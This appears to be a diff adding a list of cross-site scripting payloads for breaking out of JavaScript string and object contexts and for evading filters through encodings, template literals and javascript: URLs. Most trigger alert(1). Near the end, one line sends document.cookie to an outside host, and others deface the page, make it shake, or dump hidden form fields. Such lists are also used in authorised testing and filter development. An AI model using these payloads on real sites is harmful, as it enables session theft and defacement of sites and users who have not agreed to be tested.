@@ -1,0 +1,68 @@
+'-alert(1)-'
+'/alert(1)//
+\'-alert(1)//
+\'/alert(1)//
+'}alert(1);{'
+'}alert(1)%0A{'
+\'}alert(1);{//
+\'}alert(1)%0A{'//
+/alert(1)//\
+}/alert(1)//\
+JS Object – Nested Array
+}]}/alert(1)//\
+JS Object – Nested Function
+}}}/alert(1)//\
+${alert(1)}
+Notification.requestPermission(x=>{new(Notification)(1)})new(Notification)(1)
+';alert(1);var myObj='
+';alert(1);function myFunc(){}'
+alert`1`
+setTimeout`alert\x28document.domain\x29`
+setInterval`alert\x28document.domain\x29`
+[].pop.constructor`alert\x28document.domain\x29```(alert)(1)
+(a=alert,a(1)
+[1].map(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top[8680439..toString(30)](1)
+alert?.(document?.domain)
+[document?.domain]?.map?.(alert)
+top?.[/ale/?.source+/rt/?.source]?.(document?.[/dom/?.source+/ain/?.source])
+write`XSSed!`
+write`<img/src/o&#78error=alert&lpar;1)&gt;`
+write('\74img/src/o\156error\75alert\501\51\76')
+'}alert(1)/{//
+‘}alert(1);k:{
+')/alert(1)//
+'})/alert(1)({//
+')})/alert(1)(()=>{k:(//
+'}})/alert(1)(()=>{k:{//
+')})})/alert(1)(()=>{({k:(//
+'}})})/alert(1)(()=>{({k:{//
+top.open('javascript:alert(1)')
+top.open`javas\cript:al\ert\x281\x29`
+eval(URL.slice(-8)) #alert(1)
+eval(location.hash.slice(1)) #alert(1)
+document.write(decodeURI(location.hash)) #<img/src/onerror=alert(1)>
+alert(1)<!--
+alert(1)%0A-->
+javascript://%250Aalert(1)
+javascript://%250Dalert(1)
+javascript://%250Aalert(1)//?1
+javascript://%250A1?alert(1):0
+javascript://%250Dalert(1)//?1
+javascript://%250D1?alert(1):0
+javascript://https://DOMAIN/%250Aalert(1)//1
+javascript://https://DOMAIN/%250D1?alert(1):0
+javascript://%E2%80%A9alert(1)
+javascript://%E2%80%A9alert(1)//?1
+javascript://%E2%80%A91?alert(1):0
+javascript://https://DOMAIN/%E2%80%A91?alert(1):0
+&apos;-alert(1)-&apos;
+&quot;-alert(1)-&quot;
+documentElement.innerHTML='<h1>Not Found</h1>'
+fetch('//brutelogic.com.br/?c='+document.cookie)
+setInterval(k=>{b=document.body.style,b.marginTop=(b.marginTop=='4px')?'-4px':'4px';},5)
+f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}}
